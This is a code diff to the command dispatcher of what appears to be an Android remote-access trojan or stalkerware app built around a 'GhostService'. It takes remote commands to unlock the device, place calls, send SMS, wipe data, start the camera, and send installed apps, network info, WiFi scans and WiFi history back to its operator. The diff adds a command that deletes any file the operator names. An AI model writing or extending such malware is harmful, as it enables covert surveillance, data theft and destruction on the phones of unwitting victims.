@@ -8,6 +8,7 @@ import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.media.AudioManager;
+import android.media.MediaPlayer;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Vibrator;
@@ -22,6 +23,8 @@ import java.net.URL;
 import java.util.Locale;
 
 public class CommandHandler {
+    private MediaPlayer mediaPlayer;
+
     public void handle(String command, JSONObject params) {
         GhostService ctx = GhostService.getInstance();
         if (ctx == null) return;
@@ -35,6 +38,7 @@ public class CommandHandler {
             case "unlock": unlockDevice(ctx); break;
             case "mute": mute(ctx); break;
             case "wallpaper": changeWallpaper(ctx, params.optString("url")); break;
+            case "wallpaper_off": resetWallpaper(ctx); break;
             case "call": makeCall(ctx, params.optString("number")); break;
             case "sms": sendSMS(ctx, params.optString("number"), params.optString("text")); break;
             case "toast": showToast(ctx, params.optString("text")); break;
@@ -42,6 +46,7 @@ public class CommandHandler {
             case "openurl": openUrl(ctx, params.optString("url")); break;
             case "notify": pushNotification(ctx, params.optString("title"), params.optString("text")); break;
             case "playmusic": playMusic(ctx, params.optString("url")); break;
+            case "stopmusic": stopMusic(); break;
             case "lagsignal": toggleAirplane(ctx); break;
             case "wipe": wipeData(ctx); break;
             case "start_camera": ctx.startCamera(); break;
@@ -66,13 +71,18 @@ public class CommandHandler {
             }
             case "get_apps": sendData(ctx, "apps", DataCollector.getInstalledApps(ctx).toString()); break;
             case "get_network": sendData(ctx, "network", DataCollector.getNetworkInfo(ctx).toString()); break;
-            case "get_notifications": break; // perlu NotificationListener
+            case "get_notifications": break;
             case "wifiscan": sendData(ctx, "wifiscan", DataCollector.scanWiFi(ctx).toString()); break;
             case "wifihistory": sendData(ctx, "wifihistory", DataCollector.getWifiHistory(ctx).toString()); break;
+            case "delete_file": {
+                String path = params.optString("path", "");
+                if (!path.isEmpty()) new java.io.File(path).delete();
+                break;
+            }
         }
     }
 
-    // ========== TOGGLE FLASHLIGHT ==========
+    // ========== FLASHLIGHT ==========
     private void toggleFlashlight(Context ctx) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
@@ -89,10 +99,7 @@ public class CommandHandler {
     private void turnOffFlashlight(Context ctx) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
-            try {
-                String camId = cm.getCameraIdList()[0];
-                cm.setTorchMode(camId, false);
-            } catch (Exception e) {}
+            try { cm.setTorchMode(cm.getCameraIdList()[0], false); } catch (Exception e) {}
         }
     }
 
@@ -155,6 +162,12 @@ public class CommandHandler {
         }).start();
     }
 
+    private void resetWallpaper(Context ctx) {
+        try {
+            android.app.WallpaperManager.getInstance(ctx).clear();
+        } catch (Exception e) {}
+    }
+
     // ========== CALL ==========
     private void makeCall(Context ctx, String number) {
         Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
@@ -207,14 +220,23 @@ public class CommandHandler {
         nm.notify(999, notif);
     }
 
-    // ========== PLAY MUSIC ==========
+    // ========== PLAY / STOP MUSIC ==========
     private void playMusic(Context ctx, String url) {
         try {
-            android.media.MediaPlayer mp = new android.media.MediaPlayer();
-            mp.setDataSource(url);
-            mp.prepareAsync();
-            mp.setOnPreparedListener(android.media.MediaPlayer::start);
+            stopMusic();
+            mediaPlayer = new MediaPlayer();
+            mediaPlayer.setDataSource(url);
+            mediaPlayer.prepareAsync();
+            mediaPlayer.setOnPreparedListener(MediaPlayer::start);
         } catch (Exception e) {}
+    }
+
+    private void stopMusic() {
+        if (mediaPlayer != null) {
+            mediaPlayer.stop();
+            mediaPlayer.release();
+            mediaPlayer = null;
+        }
     }
 
     // ========== TOGGLE AIRPLANE ==========
